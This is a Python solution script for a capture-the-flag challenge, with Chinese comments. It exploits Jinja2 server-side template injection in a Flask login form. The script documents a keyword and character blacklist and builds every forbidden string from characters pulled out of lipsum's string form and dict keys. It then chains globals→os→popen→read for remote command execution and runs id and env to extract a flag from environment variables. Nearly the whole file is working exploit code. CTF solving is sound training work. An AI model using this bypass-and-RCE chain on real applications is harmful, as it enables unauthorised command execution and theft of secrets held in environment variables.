#!/usr/bin/env python3
"""
CTF 第22题：SSTI Jinja2 + 严格WAF绕过 (POST方式)
==============================================
靶机: http://fc0b9fb25c5f05ab84fda9fa.http-ctf2.dasctf.com/login
方式: POST, 参数 username (注入点), password (必填)
引擎: Jinja2 (Flask)
Flag: CTF2{08dea0d4-82b1-48e5-9a3e-d5144c15f1bb} (环境变量 FLAG)

WAF过滤规则:
- 字符级: 空格, _ (下划线), " (双引号), ' (单引号), [ (方括号)
- 关键字级(子串匹配): os, popen, system, import, eval, globals, builtins,
  class, init, mro, request, getitem, pop, form(at)
- 特殊: 'in' 不在黑名单中(但空格触发 'in blacklist' 误报)

绕过核心技术:
1. 字符提取: lipsum|string|list|batch(n)|first|last → 从函数名提取单字符
2. 字符拼接: dict(c=1)|list|first → 获取任意单字符(非下划线), 用 ~ 拼接
3. 属性访问: |attr(拼接字符串) → 替代 . 和 []
4. Dict取值: |attr(get)(拼接key) → 替代 dict[key]
5. 方法调用: (obj|attr(method))(args) → 括号包裹后加()调用

利用链:
  lipsum|attr(__globals__)            → globals dict
  globals|attr(get)(os)               → os module
  os|attr(popen)(cmd)                 → file object
  (file|attr(read))()                 → command output

字符来源映射 (lipsum|string = '<function generate_lorem_ipsum at 0x7fac206809d0>'):
  idx 0:<  1:f  2:u  3:n  4:c  5:t  6:i  7:o  8:n  10:g  11:e  12:n
  14:r  15:a  16:t  18:_  19:l  20:o  22:e  23:m  25:i  26:p  27:s
  28:u  29:m  37:f  39:c  46:d
  其他字符(如 b,v) 用 dict(c=1)|list|first 获取
"""

import requests
import re
import urllib.parse


URL = 'http://fc0b9fb25c5f05ab84fda9fa.http-ctf2.dasctf.com/login'

# lipsum|string 的字符索引表
LIPSUM_CHARS = '<function generate_lorem_ipsum at 0x7fac206809d0>'
LIPSUM_INDEX = {c: i for i, c in enumerate(LIPSUM_CHARS)}


def char_from_lipsum(idx):
    """从 lipsum|string|list 中提取第 idx 个字符 (0-based)"""
    # batch(idx+1)|first → 前 idx+1 个元素, |last → 第 idx 个
    return f'(lipsum|string|list|batch({idx+1})|first)|last'


def char_from_dict(c):
    """用 dict(c=1)|list|first 获取单字符 c"""
    return f'dict({c}=1)|list|first'


def build_str(s):
    """
    用 ~ 拼接构建任意字符串，不触发 WAF。
    优先从 lipsum 提取字符，其次用 dict 获取。
    下划线 _ 从 lipsum[18] 获取（dict 不能用 _ 作为 key name）。
    """
    parts = []
    for c in s:
        if c in LIPSUM_INDEX:
            parts.append(char_from_lipsum(LIPSUM_INDEX[c]))
        elif c == '_':
            parts.append(char_from_lipsum(18))
        else:
            # dict 可以获取任何合法 Python 标识符字符
            parts.append(char_from_dict(c))
    return '~'.join(parts)


def send_payload(payload):
    """发送 SSTI payload (POST方式, URL编码, 无空格)"""
    body = 'username=' + urllib.parse.quote(payload, safe='') + '&password=123'
    r = requests.post(
        URL,
        data=body,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=15
    )
    m = re.search(r'<h3>(.*?)</h3>', r.text, re.DOTALL)
    return m.group(1).strip() if m else r.text.strip()[:300]


def build_rce_payload(command):
    """
    构建完整的 RCE payload:
    ((lipsum|attr(__globals__))|attr(get)(os))|attr(popen)(CMD))|attr(read))()
    """
    globals_str = build_str('__globals__')
    get_str = build_str('get')
    os_str = build_str('os')
    popen_str = build_str('popen')
    read_str = build_str('read')
    cmd_str = build_str(command)

    inner = (
        '((lipsum|attr(' + globals_str + '))'
        '|attr(' + get_str + ')(' + os_str + '))'
        '|attr(' + popen_str + ')(' + cmd_str + ')'
    )
    payload = '{{((' + inner + ')|attr(' + read_str + '))()}}'
    return payload


def exec_cmd(command):
    """执行 shell 命令并返回输出"""
    payload = build_rce_payload(command)
    result = send_payload(payload)
    # HTML 实体解码
    result = result.replace('&#39;', "'").replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
    return result


if __name__ == '__main__':
    print("=" * 60)
    print("SSTI Jinja2 + 严格WAF绕过 (POST方式)")
    print("=" * 60)

    # Phase 1: 验证 SSTI
    print("\n[1] 验证 SSTI 注入")
    r = send_payload('{{7*7}}')
    print(f"    {{7*7}} → {r}")

    # Phase 2: 确认引擎
    r = send_payload('{{config|attr(dict(ENV=1)|list|first)}}')
    print(f"    config.ENV → {r}")

    # Phase 3: RCE - id
    print("\n[2] 执行 id 命令")
    r = exec_cmd('id')
    print(f"    id → {r}")

    # Phase 4: 获取 flag
    print("\n[3] 执行 env 获取 flag")
    r = exec_cmd('env')
    # 提取 FLAG 行
    for line in r.split('\n'):
        if 'FLAG' in line and '=' in line:
            print(f"    {line}")

    print("\n[+] 完成!")
